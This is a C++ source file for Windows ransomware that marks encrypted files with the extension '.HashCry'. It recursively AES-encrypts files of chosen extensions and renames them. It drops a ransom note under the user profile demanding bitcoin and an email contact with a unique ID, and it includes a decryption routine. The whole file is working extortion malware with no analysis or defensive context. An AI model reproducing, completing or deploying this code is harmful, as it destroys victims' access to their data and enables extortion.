#include "aes.h"
#include "settings.h"
#include <cstdlib>
#include <windows.h> 

void __read_me_file(const char* cPath) {
    char* userProfilePath;
    size_t len;
    errno_t err = _dupenv_s(&userProfilePath, &len, "USERPROFILE");
    if (err != 0) {
        return;
    }

    std::string desktopPath = std::string(userProfilePath) + cPath;
    std::ofstream outFile(desktopPath);

    if (outFile.is_open()) {
        outFile << "\n All your files have been encrypted!";
        outFile << "\n To decrypt them, send " + __amount + " USD in bitcoin to " + __btc_addy;
        outFile << "\n Once paid send a message to " + __email + " with your unique identifer: " + __unique_id;
        outFile << "\n Thanks and have a wonderfull rest of ur day!";
        outFile.close();
    }
    else {
    }
    free(userProfilePath); 
}

bool __check_path(std::string sPath)
{
    if (std::filesystem::exists(sPath)) {
        if (std::filesystem::is_directory(sPath)) {
            return true; 
        }
    }
    return false;
}

void aes_encrypt_files(const string& __path) {
    for (const auto& entry : fs::recursive_directory_iterator(__path)) {
        for (const std::string& ext : __extensions) {
            if (entry.path().extension() == ext) {
                ifstream inFile(entry.path(), ios::binary);
                if (inFile.is_open()) {
                    stringstream buffer;
                    buffer << inFile.rdbuf();
                    string plaintext = buffer.str();
                    inFile.close();

                    string encryptedContent = aes_encrypt(plaintext, key, __iv);

                    string encryptedFilePath = entry.path().string() + ".HashCry";

                    fs::rename(entry.path(), encryptedFilePath);

                    ofstream outFile(encryptedFilePath, ios::trunc | ios::binary);
                    if (outFile.is_open()) {
                        outFile << encryptedContent;
                        outFile.close();
                    }
                }
            }
        }
    }
}

void aes_decrypt_files(const string& __path) {
    for (const auto& entry : fs::recursive_directory_iterator(__path)) {
        for (const std::string& ex2 : __extensions_dec) {
            if (entry.path().extension() == ex2) {
            ifstream inFile(entry.path(), ios::binary);
            if (inFile.is_open()) {
                stringstream buffer;
                buffer << inFile.rdbuf();
                string encryptedContent = buffer.str();
                inFile.close();
                string decryptedContent = aes_decrypt(encryptedContent, key, __iv);
                string decryptedFilePath = entry.path().string();
                decryptedFilePath.erase(decryptedFilePath.find_last_of('.'));

                fs::rename(entry.path(), decryptedFilePath);

                ofstream outFile(decryptedFilePath, ios::trunc | ios::binary);
                if (outFile.is_open()) {
                    outFile << decryptedContent;
                    outFile.close();
                }
                }   
            }
        }
    }
}
